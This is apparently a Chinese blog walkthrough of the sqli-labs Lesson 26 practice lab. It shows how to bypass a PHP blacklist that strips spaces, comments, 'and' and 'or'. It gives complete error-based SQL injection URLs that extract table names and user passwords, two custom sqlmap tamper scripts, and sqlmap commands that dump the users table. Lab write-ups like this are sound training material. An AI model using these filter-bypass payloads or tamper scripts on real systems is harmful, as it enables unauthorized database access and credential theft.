---
title: sqli-labs lession 26 GET基于错误-你的空格和注释归我所有
date: 2018-10-05 16:24:20
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession 26 GET基于错误-你的空格和注释归我所有

---



## 登录界面

![001](/img/sql/Lesson-26/001.png)

## 分析

![002](/img/sql/Lesson-26/002.png)

```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

过滤了 or and / * -- # 空格 \

or and还可以用上一课的方法

### 绕过空格

1. /**/ 

被本课的/*过滤

2. `/**_**/`

被本课的/*过滤

3. #加一个换行符`%23%0A`和`-- `加一个换行符`--%0A`

分别被本课的#过滤和--过滤

4. 空白符替换

这里要注意下,我用的Phpstudy搭建的环境,有的成功绕过,有的不行。

%09 TAB键（水平） 

%0A 新建一行

%0C 新的一页

%0D return功能

%0B TAB键（垂直） （php-5.2.17,5.3.29成功）

%A0 空格 （php-5.2.17成功）

5. 用()绕过,意思就是不使用任何空格

括号可以用来包围子查询，任何计算结果的语句都可以使用`()`包围

## 手注

知道上述信息就可做了。如果要使用`%0B`做的话切换版本为php-5.2.17或5.3.29。用()绕过做这几个都行。

我下面用phpStudy切换版本为php-5.4.45做。

### 获取数据库名

`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,database(),0x7e))%7c%7c'1`

![003](/img/sql/Lesson-26/003.png)

### 获取表名

`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),0x7e))%7c%7c'1`

![004](/img/sql/Lesson-26/004.png)

### 获取列名

`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),0x7e))%7c%7c'1`

![005](/img/sql/Lesson-26/005.png)

### 获取字段值

原谅我数据库学的不好,暂时只想到了按id找。

`http://192.168.75.132/sql/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(concat(username,'~',passwoorrd))from(security.users)where(id=1)),0x7e))%7c%7c'1`

![006](/img/sql/Lesson-26/006.png)

## SQLMAP

sqlmap跑的话要切换php-5.2.17的版本

### 修改脚本

space2plus.py：空格替换为加号

在sqlmap的tamper目录下新建space0A.py文件,把space2plus.py脚本中内容复制过来,+改成`%A0`。

```
#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with plus ('%A0')

    Notes:
        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards
        * This tamper script works against all databases

    >>> tamper('SELECT id FROM users')
    'SELECT%A0id%A0FROM%A0users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "%A0"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "%A0"
                continue

            retVal += payload[i]

    return retVal
```

### 运行

结合上次双写绕过and和or的andor.py脚本跑一下。

`python sqlmap.py -u "http://192.168.75.132/sql/Less-26/?id=1" --threads 10 --technique E --dbms mysql --tamper "space0A.py,andor.py" --fresh-queries --flush-session`

```
--dbsm msql:指定后端数据库为mysql
--technique E:指定注入方式为报错注入
--threads 10:指定并发线程数为10
--tamper space0A.py,andor.py
	andor.py:payload中的and用anandd or用oorr替代
	space0A.py:空格用%A0替代
--fresh-queries:发起新请求 
--flush-session：刷新session
```

![007](/img/sql/Lesson-26/007.png)

![008](/img/sql/Lesson-26/008.png)

`python sqlmap.py -u "http://192.168.75.133/sql/Less-26/?id=1" --threads 10 --technique E --dbms mysql --tamper "andor.py,space0A.py" -D security --tables  --fresh-queries --flush-session`

![008_1](/img/sql/Lesson-26/008_1.png)

![008_2](/img/sql/Lesson-26/008_2.png)

跑字段的时候出现了问题,拿不到数据。原来SQLMAP的payload中使用了`count(*)`包括了`*`，但是`*`被过滤了。自然得不出结果。

![008_3](/img/sql/Lesson-26/008_3.png)



通过查询资料可以发现`count(*)`和`count(常量)`是等价的,添加一个把`count(*)`替换成`count(1)`的脚本,命名为`count.py`

```
#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    >>> tamper('count(*)')
    'count(1)'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)count\(\*\)", r"count(1)", payload)

    return retVal
```



我这里重启了虚拟机ip地址变了,不过不影响实验结果。

`python sqlmap.py -u "http://192.168.75.133/sql/Less-26/?id=1" --threads 10 --technique E --dbms mysql --tamper "andor.py,space0A.py,count.py" -D security -T users  --columns --dump --fresh-queries --flush-session`

![009](/img/sql/Lesson-26/009.png)

![010](/img/sql/Lesson-26/010.png)





